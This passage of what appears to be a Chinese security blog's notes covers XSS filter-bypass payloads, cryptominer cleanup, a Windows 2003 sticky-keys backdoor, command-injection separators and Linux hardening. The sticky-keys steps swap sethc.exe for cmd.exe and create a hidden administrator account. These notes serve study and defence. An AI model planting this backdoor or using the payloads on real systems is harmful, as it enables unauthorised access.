<h2 id="绕过替换script和on事件的XSS"><a href="#绕过替换script和on事件的XSS" class="headerlink" title="绕过替换script和on事件的XSS"></a>绕过替换script和on事件的XSS</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.绕过思路</span><br><span class="line">寻找过滤内容</span><br><span class="line"></span><br><span class="line">2.伪协议绕过</span><br><span class="line">payload:&quot;&gt;&lt;a href&#x3D;&quot;javascript:alert(document.domain)&quot;&gt;xss&lt;&#x2F;a&gt;</span><br><span class="line"></span><br><span class="line">3.空格绕过</span><br><span class="line">paylaod:&quot;&gt;&lt;a href&#x3D;&quot;javascr   ipt:alert(document.domain);&quot;&gt;xss&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
<h2 id="十六进制绕过触发XSS"><a href="#十六进制绕过触发XSS" class="headerlink" title="十六进制绕过触发XSS"></a>十六进制绕过触发XSS</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.16进制</span><br><span class="line">16进制转换，16进制每一位上可以是从小到大为0，1，2，3，4，5，6，7，8，9，A,B,C,D,E,F 16个大小不同的数，即逢16进1.</span><br><span class="line">其中用A,B,C,D,E,F(不区分大小写)来分别表示10，11，12，13，14，15</span><br><span class="line"></span><br><span class="line">使用python将字符转换为16进制类型：</span><br><span class="line">print(&quot;\\x&quot;+binascii.ba2_hex(s))</span><br><span class="line"></span><br><span class="line">2.双斜杠+十六进制绕过</span><br><span class="line">\\x32 \\x3c</span><br><span class="line"></span><br><span class="line">3.触发XSS</span><br><span class="line">payload:\\x3cscript\\x3ealert(document.domain);\\x3c&#x2F;script\\x3e</span><br></pre></td></tr></table></figure>
<h2 id="unicode绕过触发XSS"><a href="#unicode绕过触发XSS" class="headerlink" title="unicode绕过触发XSS"></a>unicode绕过触发XSS</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.unicode介绍</span><br><span class="line">Unicode包括字符集和编码方案，Unicode是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。</span><br><span class="line"></span><br><span class="line">使用python将字符转换为unicode类型：</span><br><span class="line">print &quot;\\u00&quot;+binascii.b2a_hex(&quot;&gt;&quot;)</span><br><span class="line"></span><br><span class="line">2.双斜杠+unicode绕过</span><br><span class="line">3.触发XSS</span><br><span class="line">payload:\\u003cscript\\u003ealert(document.domain);\\u003c&#x2F;script\\u003e</span><br></pre></td></tr></table></figure>
<h2 id="浏览器同源策略"><a href="#浏览器同源策略" class="headerlink" title="浏览器同源策略"></a>浏览器同源策略</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.源的含义</span><br><span class="line">源头，信息来源的位置。</span><br><span class="line">在计算机中源是由协议、主机名、端口名组成。</span><br><span class="line">范例：</span><br><span class="line">协议:&#x2F;&#x2F;主机名:端口号&#x2F;</span><br><span class="line"></span><br><span class="line">2.同源策略</span><br><span class="line">在计算机中，同源策略(same-orgin plicy,SOP)用于阻止一个非同源的页面恶意代码去访问另一个非同源页面。</span><br><span class="line">只有两个页面属于同一个源才能互相访问。不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。所有a.com下的js脚本读取b.com里面的文件数据会报错。</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">源A页面要访问源B页面认证Cookie，如果不加阻止读取cookie，会造成Cookie欺骗绕过登录验证。</span><br><span class="line">注意：同源一定是协议、主机名、端口号完全一致。</span><br><span class="line"></span><br><span class="line">3.IE源的特殊处理</span><br><span class="line">(1)位于可信域trust zones的互信域名间，不受同源策略限制</span><br><span class="line">(2)IE在判断同源时不考虑端口。</span><br><span class="line"></span><br><span class="line">4.document.domain</span><br><span class="line">domain属性可以解决因同源安全策略带来的不同文档的属性共享问题，降域document.domain</span><br><span class="line">同源策略认为域和子域属于不同的域，如：</span><br><span class="line">child.a.com和a.com</span><br><span class="line">child1.a.com合child2.a.com</span><br><span class="line">xxx.child1.a.com合child1.a.com</span><br><span class="line">两两不同源，可以通过设置document.domain&#x3D;&#39;a.com&#39;,浏览器就会认为它们属于同一个源。</span><br><span class="line">想要实现以上任意两个页面之间的通信，两个页面必须都设置document.domain&#x3D;&#39;a.com&#39;</span><br></pre></td></tr></table></figure>
<h2 id="编码转义"><a href="#编码转义" class="headerlink" title="编码转义"></a>编码转义</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.URL编码</span><br><span class="line">考虑到安全传输问题，防止url字符丢失，并且进一步保证完整性，url引入了转义机制，将不安全的字符编码为安全的字符再进行传输。</span><br><span class="line"></span><br><span class="line">2.html编码</span><br><span class="line">一些保留字符出现在文本节点和标签值里是不安全的。比如&quot;&lt;&gt;&quot;会被浏览器误认为标签，如果想要正确的显示这些字符，需要用到html编码。</span><br><span class="line"></span><br><span class="line">实体编码：一般以&quot;&amp;&quot;开头，&quot;;&quot;结尾，可以不加&quot;;&quot;。</span><br><span class="line">进制编码：以&quot;&amp;#&quot;开头，加上字符的数值，&quot;;&quot;结尾，可以不加&quot;;&quot;。字符的数值可以是任意十进制ascii码或Unicode字符编码。</span><br><span class="line">十六进制的数值需要在编码数字前加&quot;x&quot;。</span><br><span class="line"></span><br><span class="line">3.javascript编码</span><br><span class="line">数字形式：</span><br><span class="line">\u后面加4位16进制数字(或\x后加2位16进制数字)，按字符的unicode数值编码，不足位数以零补充。如&quot;&lt;&quot;转为&quot;\u003c&quot;或&quot;\x3c&quot;。</span><br><span class="line"></span><br><span class="line">4.编码含义</span><br><span class="line">浏览器对提交的编码进行自解析，执行。</span><br></pre></td></tr></table></figure>
<h2 id="XSS发生的位置"><a href="#XSS发生的位置" class="headerlink" title="XSS发生的位置"></a>XSS发生的位置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.GET型URL中的XSS</span><br><span class="line">如果在URL中提交的参数值，在页面中显示，则可能存在XSS。</span><br><span class="line"></span><br><span class="line">2.POST型表单中的XSS</span><br><span class="line">在表单中提交的参数值，在页面中显示，则可能存在XSS。</span><br><span class="line"></span><br><span class="line">3.JSON中的XSS</span><br><span class="line">JSON是一种轻量级的数据交换格式，便于人阅读和编写，同时也易于机器解析和生成，并有效提升网络传输效率。</span><br><span class="line">JSON最常用的格式是对象的键值对。</span><br></pre></td></tr></table></figure>
<h2 id="自动化XSS挖掘工具-xsser"><a href="#自动化XSS挖掘工具-xsser" class="headerlink" title="自动化XSS挖掘工具-xsser"></a>自动化XSS挖掘工具-xsser</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.XSSer工具介绍</span><br><span class="line">xsser是一款用于针对web应用程序自动化挖掘、利用、报告xss漏洞的框架。</span><br><span class="line"></span><br><span class="line">2.工具原理</span><br><span class="line">官方网站：http:&#x2F;&#x2F;xsser.03c8.net</span><br><span class="line"></span><br><span class="line">3.xsser启动</span><br><span class="line">图形化界面：xsser --gtk</span><br></pre></td></tr></table></figure>
<h2 id="XSS-Fuzzing工具"><a href="#XSS-Fuzzing工具" class="headerlink" title="XSS Fuzzing工具"></a>XSS Fuzzing工具</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">XSSstrike</span><br></pre></td></tr></table></figure>
<h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><h4 id="httponly防止盗cookie"><a href="#httponly防止盗cookie" class="headerlink" title="httponly防止盗cookie"></a>httponly防止盗cookie</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.cookie</span><br><span class="line">cookie是某些网站为了辨别用户身份、进行session跟踪，而存储在用户本地终端上的数据（通常经过加密）。</span><br><span class="line">cookie有的是临时的，有的是持续的。临时的cookie只在浏览器上保存一段时间，超过规定时间，cookie就会被系统清除。</span><br><span class="line"></span><br><span class="line">2.cookie作用</span><br><span class="line">cookie是存储在客户端的一小段数据，浏览器通过HTTP协议合服务端进行cookie交互，通常用来存储一些不敏感信息。</span><br><span class="line"></span><br><span class="line">3.清除cookie</span><br><span class="line">通过浏览器工具清除cookie；</span><br><span class="line">通过设置cookie的有效期来清除cookie，删除cookie可能导致某些页面不可用。</span><br><span class="line"></span><br><span class="line">4.cookie httponly</span><br><span class="line">setcookie(&quot;abc&quot;,&quot;test&quot;,NULL,NULL,NULL,NULL,TRUE)，设置secure参数为true后，就不能使用js获取cookie。</span><br></pre></td></tr></table></figure>
<h4 id="XSS-Filter过滤器"><a href="#XSS-Filter过滤器" class="headerlink" title="XSS Filter过滤器"></a>XSS Filter过滤器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.htmlspecialchars()函数</span><br><span class="line">把预定义的字符转换为HTML实体。</span><br><span class="line">预定义字符：</span><br><span class="line">&amp;和号变成&amp;</span><br><span class="line">&quot;双引号变成&quot;</span><br><span class="line">&#39;单引号变成&#39;</span><br><span class="line">&lt;小于变成&lt;</span><br><span class="line">&gt;大于变成&gt;</span><br><span class="line"></span><br><span class="line">2.htmlentities()函数</span><br><span class="line">对于过滤用户输入的数据非常有用，它会将一些特殊字符转换为HTML实体。</span><br><span class="line">例如用户输入&lt;，就会被该函数转化为HTML实体&lt;(&amp;alt)</span><br><span class="line"></span><br><span class="line">3.strip_tags()函数</span><br><span class="line">该函数会剥去字符串中的HTML、XML以及PHP的标签。</span><br><span class="line">该函数始终会剥离HTML注释，这点无法通过allow参数改变。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>检测恶意挖矿</title>
    <url>/2020/07/10/%E6%A3%80%E6%B5%8B%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="Linux下检测恶意挖矿行为"><a href="#Linux下检测恶意挖矿行为" class="headerlink" title="Linux下检测恶意挖矿行为"></a>Linux下检测恶意挖矿行为</h1><h2 id="Linux知识"><a href="#Linux知识" class="headerlink" title="Linux知识"></a>Linux知识</h2><p>ps命令：可查看当前系统的进程状态，搭配kill指令随时中断、删除不必要的程序。使用该命令可以确定有哪些进程正在运行和运行的状态等。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kill进程：kill -9 进程id</span><br></pre></td></tr></table></figure>
<p>top命令：实时动态地查看系统的整体运行情况。</p>
<p>netstat 命令：查看Linux系统中网络系统的状态信息。</p>
<p>cron服务：计划任务</p>
<h2 id="异常进程排查"><a href="#异常进程排查" class="headerlink" title="异常进程排查"></a>异常进程排查</h2><p>1.查看进程使用CPU和内存的情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">top –c</span><br></pre></td></tr></table></figure>
<p>-c参数可直接查找到异常程序的物理位置。通过查看消耗CPU和内存较多的程序是否是未知程序。</p>
<p>2.grep 恶意程序名称</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果知道恶意程序的名称，直接通过ps –ef | grep 恶意进程名称</span><br></pre></td></tr></table></figure>
<h2 id="异常会话排查"><a href="#异常会话排查" class="headerlink" title="异常会话排查"></a>异常会话排查</h2><p>查看是否有异常会话连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat –pantul | grep ESTAB</span><br></pre></td></tr></table></figure>
<h2 id="计划任务排查"><a href="#计划任务排查" class="headerlink" title="计划任务排查"></a>计划任务排查</h2><p>1.查看是否存在异常未知任务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询当前计划任务中是否存在异常未知任务:</span><br><span class="line">crontab –l</span><br></pre></td></tr></table></figure>
<p>2.查看root用户任务计划</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</span><br></pre></td></tr></table></figure>
<p>3.查看计划任务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br></pre></td></tr></table></figure>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>【https:]//www[.]hetianlab.com/expc.do?ce=94f48620-eda1-4939-b0a1-34154279dc3d</p>
]]></content>
      <categories>
        <category>恶意代码</category>
      </categories>
      <tags>
        <tag>挖矿</tag>
      </tags>
  </entry>
  <entry>
    <title>恶意挖矿清除常规步骤</title>
    <url>/2020/07/10/%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E6%B8%85%E9%99%A4%E5%B8%B8%E8%A7%84%E6%AD%A5%E9%AA%A4/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="恶意挖矿清除"><a href="#恶意挖矿清除" class="headerlink" title="恶意挖矿清除"></a>恶意挖矿清除</h1><h2 id="清除恶意程序计划任务"><a href="#清除恶意程序计划任务" class="headerlink" title="清除恶意程序计划任务"></a>清除恶意程序计划任务</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编辑 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 和&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br><span class="line">删除恶意计划任务内容</span><br></pre></td></tr></table></figure>
<h2 id="杀死恶意程序进程"><a href="#杀死恶意程序进程" class="headerlink" title="杀死恶意程序进程"></a>杀死恶意程序进程</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在知道恶意程序名称情况下：</span><br><span class="line">ps -ef | grep 恶意程序名称</span><br></pre></td></tr></table></figure>
<p>在定位到恶意程序在系统中的位置后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pkill 直接杀死程序</span><br><span class="line">Kill -9 PID</span><br></pre></td></tr></table></figure>
<h2 id="清除恶意程序"><a href="#清除恶意程序" class="headerlink" title="清除恶意程序"></a>清除恶意程序</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm –rf 恶意程序物理地址</span><br></pre></td></tr></table></figure>
<h2 id="iptables禁止恶意程序联网"><a href="#iptables禁止恶意程序联网" class="headerlink" title="iptables禁止恶意程序联网"></a>iptables禁止恶意程序联网</h2><p>检查恶意程序外网互联地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat –pantul | grep ESTAB</span><br></pre></td></tr></table></figure>
<p>下发外网访问控制策略</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">依据查询出的外网互联地址，直接下发访问控制策略，禁止服务访问这些网络地址</span><br><span class="line">iptables –A OUTPUT –d xx.x.xx.xx –j DROP</span><br><span class="line">重启设备</span><br></pre></td></tr></table></figure>
<h2 id="重做系统"><a href="#重做系统" class="headerlink" title="重做系统"></a>重做系统</h2><p>中了恶意程序的机器，在清除恶意程序后，最后都要重做系统。</p>
]]></content>
      <categories>
        <category>恶意代码</category>
      </categories>
      <tags>
        <tag>挖矿</tag>
      </tags>
  </entry>
  <entry>
    <title>win2003-shift后门</title>
    <url>/2020/07/10/win2003-shift%E5%90%8E%E9%97%A8/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="Win2003-shift后门"><a href="#Win2003-shift后门" class="headerlink" title="Win2003 shift后门"></a>Win2003 shift后门</h1><h2 id="shift键"><a href="#shift键" class="headerlink" title="shift键"></a>shift键</h2><p> Windows中的粘滞键是专为同时按下两个或多个键有困难的人设计的。粘滞键的主要功能是方便Shift、Ctrl、Alt与其他键的组合使用。在我们使用热键时，例如“CTRL+C”，用粘滞键就可以一次只按一个键来完成复制的功能。</p>
<p><img src="/2020/07/10/win2003-shift%E5%90%8E%E9%97%A8/image-20200710133156606.png" alt="image-20200710133156606"></p>
<p>启动粘滞键可通过单击“开始→设置→控制面板→辅助功能选项”，在“键盘”选项卡下选中“使用粘滞键”来启动。在开启粘滞键的时候，任务栏右边的系统托盘区会出现粘滞键图标。如果想关闭粘滞键，只需将“使用粘滞键”前的钩消除就可以。</p>
<h2 id="系统后门"><a href="#系统后门" class="headerlink" title="系统后门"></a>系统后门</h2><p> 后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。  后门是一种登录系统的方法，它不仅绕过系统已有的安全设置，而且还能挫败系统上各种增强的安全设置。</p>
<p>后门程序又称特洛依木马，其用途在于潜伏在电脑中，从事搜集信息或便于黑客进入的动作。后门程序和电脑病毒最大的差别，在于后门程序不一定有自我复制的动作，也就是后门程序不一定会“感染”其它电脑。</p>
<p>系统级的后门才是最好的后门，因为他不易被发现，利用系统的漏洞来利用，通过将原系统文件替换，一般不去检查对应文件大小或者原文件位置比对的话，很难被发现。</p>
<h2 id="shift后门制作"><a href="#shift后门制作" class="headerlink" title="shift后门制作"></a>shift后门制作</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">点击开始 -&gt; 运行，在运行的对话框中输入cmd回车</span><br><span class="line">切换至system32目录：cd c:\windows\system32</span><br></pre></td></tr></table></figure>
<p>备份sethc.exe </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">move sethc.exe sethc.exe.bak</span><br></pre></td></tr></table></figure>
<p>将cmd.exe改成为sethc.exe</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy cmd.exe sethc.exe</span><br></pre></td></tr></table></figure>
<h2 id="登录shift后门"><a href="#登录shift后门" class="headerlink" title="登录shift后门"></a>登录shift后门</h2><p>点击开始 -&gt; 运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入mstsc，打开远程桌面，进入登录界面后</span><br><span class="line">连续按5次shift键，激活后门程序</span><br></pre></td></tr></table></figure>
<p>输入net user查看当前账户信息</p>
<p><img src="/2020/07/10/win2003-shift%E5%90%8E%E9%97%A8/image-20200710134415502.png" alt="image-20200710134415502"></p>
<p>新建用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user test 123456 &#x2F;add</span><br></pre></td></tr></table></figure>
<p>将新加用户添加至administrators组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net localgroup administrators test &#x2F;add</span><br></pre></td></tr></table></figure>
<p>激活账户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user test &#x2F;active:yes</span><br></pre></td></tr></table></figure>
<p>输入新加账户和密码进入目标主机</p>
]]></content>
      <categories>
        <category>Windows系统安全</category>
      </categories>
      <tags>
        <tag>win2003</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行漏洞</title>
    <url>/2020/07/10/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="什么是命令执行"><a href="#什么是命令执行" class="headerlink" title="什么是命令执行"></a>什么是命令执行</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.原理</span><br><span class="line">Web应用程序接收用户输入，拼接到要执行的系统命令中执行。</span><br><span class="line">产生原因：</span><br><span class="line">用户输入未过滤或净化</span><br><span class="line">拼接到系统命令中执行</span><br><span class="line"></span><br><span class="line">2.PHP下的命令执行函数</span><br><span class="line">system</span><br><span class="line">exec</span><br><span class="line">shell_exec</span><br><span class="line">passthru</span><br><span class="line">popen</span><br><span class="line">proc_popen</span><br><span class="line"></span><br><span class="line">payload示例：</span><br><span class="line">xxx.xxx.com&#x2F;?cmd&#x3D;ipconfig</span><br></pre></td></tr></table></figure>
<h2 id="windows下命令执行"><a href="#windows下命令执行" class="headerlink" title="windows下命令执行"></a>windows下命令执行</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.利用思路</span><br><span class="line">当代码中拼接用户的输入并带入system函数执行，但无法直接执行用户的自定义命令。</span><br><span class="line">思路：</span><br><span class="line">截断输入，重新拼接，两条命令都输入并执行。</span><br><span class="line"></span><br><span class="line">2.命令执行漏洞拼接符</span><br><span class="line">在windows系统下的cmd命令，有以下截断拼接符：</span><br><span class="line">&amp;前面的语句为假则直接执行后面的</span><br><span class="line">&amp;&amp;前面的语句为假则直接出错，后面的也不执行</span><br><span class="line">|直接执行后面的语句</span><br><span class="line">||前面出错执行后面的</span><br><span class="line"></span><br><span class="line">正常情况下ping 127.0.0.1</span><br><span class="line">ping 111 &amp; ipconfig</span><br><span class="line">ping 127.0.0.1 &amp;&amp; ipconfig</span><br><span class="line">ping 127.0.0.1 | ipconfig</span><br><span class="line">ping 111 || ipconfig</span><br></pre></td></tr></table></figure>
<h2 id="Linux下命令执行"><a href="#Linux下命令执行" class="headerlink" title="Linux下命令执行"></a>Linux下命令执行</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.命令执行漏洞拼接符</span><br><span class="line">在Linux系统下的shell命令中，有以下一些截断拼接符：</span><br><span class="line">;执行完前面的执行后面的</span><br><span class="line">|管道符，显示后面的执行结果</span><br><span class="line">||当前面的执行出错时执行后面的</span><br><span class="line">&amp;无论前边语句真假都会执行</span><br><span class="line">&amp;&amp;只有前面语句为真，才会执行后边语句</span><br></pre></td></tr></table></figure>
<h2 id="命令执行自动化测试工具"><a href="#命令执行自动化测试工具" class="headerlink" title="命令执行自动化测试工具"></a>命令执行自动化测试工具</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.COmmix</span><br><span class="line">commix是一个使用Python开发的漏洞测试工具，用于测试一个请求是否存在命令执行漏洞，可直接导入burp的历史记录进行检测。</span><br><span class="line">项目地址：https:&#x2F;&#x2F;github.com&#x2F;stasinopoulos&#x2F;commix</span><br><span class="line">在kali中自带了commix工具</span><br><span class="line"></span><br><span class="line">2.commix工具基本使用</span><br><span class="line">commix -u xxx.xxx.com&#x2F;test.php?cmd&#x3D;127.0.0.1</span><br></pre></td></tr></table></figure>
<h2 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">避免或少用执行命令的函数或者直接禁用；</span><br><span class="line">进入执行命令的函数&#x2F;方法之前，对参数进行过滤，对敏感字符进行转义；</span><br><span class="line">disable_functions中禁用执行命令的函数；</span><br><span class="line">对于可控点是程序参数的情况下，使用escapeshellcmd函数进行过滤；</span><br><span class="line">对于可控点是程序参数值的情况下，使用escapeshellarg函数进行过滤；</span><br><span class="line">参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。</span><br></pre></td></tr></table></figure>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/articles/network/154670.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/154670.html</a></p>
<p>命令执行漏洞综合分析：</p>
<p><a href="http://www.hetianlab.com/cour.do?w=1&amp;c=C9d6c0ca797abec2016071516463300001" target="_blank" rel="noopener">http://www.hetianlab.com/cour.do?w=1&amp;c=C9d6c0ca797abec2016071516463300001</a></p>
<p>ImageMagick命令执行漏洞：</p>
<p><a href="http://www.hetianlab.com/expc.do?ce=8700261e-dbcd-4a3a-aad4-1ad74de4a091" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=8700261e-dbcd-4a3a-aad4-1ad74de4a091</a></p>
<p>Struts2(s2-045)远程命令执行：</p>
<p><a href="http://www.hetianlab.com/expc.do?ec=ECID9d6c0ca797abec2017031012041000001" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ec=ECID9d6c0ca797abec2017031012041000001</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux系统加固</title>
    <url>/2020/07/10/Linux%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="Linux系统加固"><a href="#Linux系统加固" class="headerlink" title="Linux系统加固"></a>Linux系统加固</h1><p>用于指导系统管理人员或安全检查人员进行Linux操作系统的安全合规性检查和加固。</p>
<h2 id="账号和口令"><a href="#账号和口令" class="headerlink" title="账号和口令"></a>账号和口令</h2><h4 id="禁用或删除无用账号"><a href="#禁用或删除无用账号" class="headerlink" title="禁用或删除无用账号"></a>禁用或删除无用账号</h4><p>使用命令 userdel &lt;用户名&gt; 删除不必要的账号。</p>
<p>使用命令 passwd -l &lt;用户名&gt; 锁定不必要的账号。</p>
<p>使用命令 passwd -u &lt;用户名&gt; 解锁必要的账号。</p>
<h4 id="检查特殊账号"><a href="#检查特殊账号" class="headerlink" title="检查特殊账号"></a>检查特殊账号</h4><p>检查是否存在空口令和root权限的账号。</p>
<p>1、查看空口令和root权限账号，确认是否存在异常账号：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk -F: &#39;($2&#x3D;&#x3D;&quot;&quot;)&#39; &#x2F;etc&#x2F;shadow 查看空口令账号。</span><br><span class="line"></span><br><span class="line">awk -F: &#39;($3&#x3D;&#x3D;0)&#39; &#x2F;etc&#x2F;passwd 查看UID为零的账号。</span><br></pre></td></tr></table></figure>
<p>2、加固口令账号：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">passwd &lt;用户名&gt; 为空口令账号设定密码。</span><br><span class="line"></span><br><span class="line">确认UID为零的账号只有root账号。</span><br></pre></td></tr></table></figure>
<h4 id="添加口令策略"><a href="#添加口令策略" class="headerlink" title="添加口令策略"></a>添加口令策略</h4><p>加强口令的复杂度等，降低被猜解的可能性。</p>
<p>1、使用命令 vi /etc/login.defs 修改配置文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PASS_MAX_DAYS 90 #新建用户的密码最长使用天数</span><br><span class="line"></span><br><span class="line">PASS_MIN_DAYS 0 #新建用户的密码最短使用天数</span><br><span class="line"></span><br><span class="line">PASS_WARN_AGE 7 #新建用户的密码到期提前提醒天数</span><br></pre></td></tr></table></figure>
<p>2、使用chage命令修改用户设置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如，chage -m 0 -M 30 -E 2000-01-01 -W 7 &lt;用户名&gt;表示将此用户的密码最长使用天数设为30，最短使用天数设为0，密码2000年1月1日过期，过期前七天警告用户。</span><br></pre></td></tr></table></figure>
<p>3、设置连续输错三次密码，账号锁定五分钟。</p>
<p>使用命令 vi /etc/pam.d/common-auth修改配置文件，在配置文件中添加 auth required pam_tally.so onerr=fail deny=3 unlock_time=300。</p>
<h4 id="限制用户su"><a href="#限制用户su" class="headerlink" title="限制用户su"></a>限制用户su</h4><p>限制能su到root的用户。</p>
<p>使用命令 <code>vi /etc/pam.d/su</code>修改配置文件，在配置文件中添加行。例如，只允许test组用户su到root，则添加 auth required pam_wheel.so group=test。</p>
<h4 id="禁止用户直接登录"><a href="#禁止用户直接登录" class="headerlink" title="禁止用户直接登录"></a>禁止用户直接登录</h4><p>限制root用户直接登录。</p>
<p>1、创建普通权限账号并配置密码,防止无法远程登录;</p>
<p>2、使用命令 <code>vi /etc/ssh/sshd_config</code>修改配置文件将PermitRootLogin的值改成no，并保存，然后使用<code>service sshd restart</code>重启服务。</p>
<h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><h4 id="关闭不必要的服务"><a href="#关闭不必要的服务" class="headerlink" title="关闭不必要的服务"></a>关闭不必要的服务</h4><p>关闭不必要的服务（如普通服务和xinetd服务），降低风险。</p>
<p>使用命令<code>systemctl disable&lt;服务名&gt;</code>设置服务在开机时不自动启动。</p>
<p>说明： 对于部分老版本的Linux操作系统（如CentOS 6），可以使用命令chkconfig –level &lt;init级别&gt; &lt;服务名&gt; off设置服务在指定init级别下开机时不自动启动。</p>
<h4 id="SSH服务安全"><a href="#SSH服务安全" class="headerlink" title="SSH服务安全"></a>SSH服务安全</h4><p>对SSH服务进行安全加固，防止暴力破解成功。</p>
<p>使用命令 <code>vim /etc/ssh/sshd_config</code> 编辑配置文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">不允许root账号直接登录系统。设置 PermitRootLogin 的值为 no。</span><br><span class="line"></span><br><span class="line">修改SSH使用的协议版本。设置 Protocol 的版本为 2。</span><br><span class="line"></span><br><span class="line">修改允许密码错误次数（默认6次）。设置 MaxAuthTries 的值为 3。</span><br></pre></td></tr></table></figure>
<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><h4 id="设置umask值"><a href="#设置umask值" class="headerlink" title="设置umask值"></a>设置umask值</h4><p>设置默认的umask值，增强安全性。</p>
<p>使用命令 <code></code>vi /etc/profile` 修改配置文件，添加行 umask 027， 即新创建的文件属主拥有读写执行权限，同组用户拥有读和执行权限，其他用户无权限。</p>
<h4 id="设置登录超时"><a href="#设置登录超时" class="headerlink" title="设置登录超时"></a>设置登录超时</h4><p>设置系统登录后，连接超时时间，增强安全性。</p>
<p>使用命令<code>vi /etc/profile</code> 修改配置文件，将以 TMOUT= 开头的行注释，设置为TMOUT=180，即超时时间为三分钟。</p>
<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><h4 id="syslog日志"><a href="#syslog日志" class="headerlink" title="syslog日志"></a>syslog日志</h4><p>启用日志功能，并配置日志记录。</p>
<p>Linux系统默认启用以下类型日志：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">系统日志（默认）&#x2F;var&#x2F;log&#x2F;messages</span><br><span class="line"></span><br><span class="line">cron日志（默认）&#x2F;var&#x2F;log&#x2F;cron</span><br><span class="line"></span><br><span class="line">安全日志（默认）&#x2F;var&#x2F;log&#x2F;secure</span><br></pre></td></tr></table></figure>
